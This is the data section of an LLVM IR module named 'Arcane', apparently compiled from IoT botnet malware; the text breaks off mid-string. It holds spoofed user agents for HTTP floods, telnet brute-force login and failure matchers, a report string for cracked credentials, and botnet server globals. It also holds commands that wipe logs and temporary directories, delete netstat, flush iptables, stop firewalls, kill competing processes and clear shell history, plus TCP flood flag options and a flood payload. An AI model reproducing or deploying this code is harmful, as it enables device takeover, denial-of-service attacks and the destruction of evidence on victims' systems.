; ModuleID = 'host/ir_O1/Arcane.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = local_unnamed_addr global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.10 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.14 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.15 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.16 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.18 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.19 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.20 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.21 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.23 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.24 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.25 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.27 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.28 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.29 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.31 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.32 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.33 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.34 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.36 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.38 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.40 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.41 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.42 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.45 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.47 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.48 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.49 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.51 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.53 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.54 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.55 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.56 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.57 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.58 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.59 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.60 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.61 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.62 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.63 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.64 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@BusyBoxPayload = local_unnamed_addr global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.66, i64 0, i64 0), align 8
@.str.66 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [0 x i8*] zeroinitializer, align 8
@tmpdirs = local_unnamed_addr global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* null], align 16
@.str.67 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.80, i32 0, i32 0), i8* null], align 16
@.str.77 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.78 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.80 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.81 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.84 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.89 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@botnetServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@switchCommStock = local_unnamed_addr global i32 0, align 4
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@botnetPid = common local_unnamed_addr global i32 0, align 4
@ServerInfo = common local_unnamed_addr global [100 x i32] zeroinitializer, align 16
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@x = internal unnamed_addr global i32 0, align 4
@y = internal unnamed_addr global i32 0, align 4
@z = internal unnamed_addr global i32 0, align 4
@w = internal unnamed_addr global i32 0, align 4
@rand_alphastr.alphaset = internal unnamed_addr constant [32 x i8] c"xq6fh0jrwxiugrogtzqf5p28fnxlm5j\00", align 16
@.str.144 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.91 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [34 x i8] c"Arcane Bruteforced = %s [ %s:%s ]\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.99 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.100 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.101 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.102 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.103 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.104 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.106 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.107 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.108 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.109 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.110 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.111 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.114 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.115 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.116 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.117 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.118 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.123 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendSTD.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.124, i32 0, i32 0)], align 8
@.str.124 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF